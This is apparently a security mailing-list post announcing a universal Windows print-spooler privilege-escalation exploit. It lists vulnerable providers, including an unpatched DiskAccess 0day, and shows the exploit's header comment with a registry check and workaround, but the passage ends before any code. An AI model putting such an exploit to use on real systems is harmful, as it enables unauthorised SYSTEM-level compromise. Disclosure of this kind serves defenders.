Subject: Universal printer provider exploit for Windows

We have developed a new exploit that should allow code execution as SYSTEM
with the following software:

- DiskAccess NFS Client (dapcnfsd.dll v0.6.4.0) - REPORTED & NOTFIXED
-0day!!!
- Citrix Metaframe - cpprov.dll - FIXED
- Novell (nwspool.dll - CVE-2006-5854 - untested. pls give feedback)
More information at :

/*
Title: Universal exploit for vulnerable printer providers (spooler service).
 Vulnerability: Insecure EnumPrintersW() calls
 Author: Andres Tarasco Acu침a - atarasco@....es
 Website: http://www.514.es


 This code should allow to gain SYSTEM privileges with the following
software:
 blink !blink! blink!

 - DiskAccess NFS Client (dapcnfsd.dll v0.6.4.0) - REPORTED & NOTFIXED
-0day!!!
 - Citrix Metaframe - cpprov.dll  - FIXED
 - Novell (nwspool.dll  - CVE-2006-5854 - untested)
 - More undisclosed stuff =)

  If this code crashes your spooler service (spoolsv.exe) check your
  "vulnerable" printer providers at:
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Providers

  Workaround: Trust only default printer providers "Internet Print Provider"

  and "LanMan Print Services" and delete the other ones.

  And remember, if it doesnt work for you, tweak it yourself. Do not ask
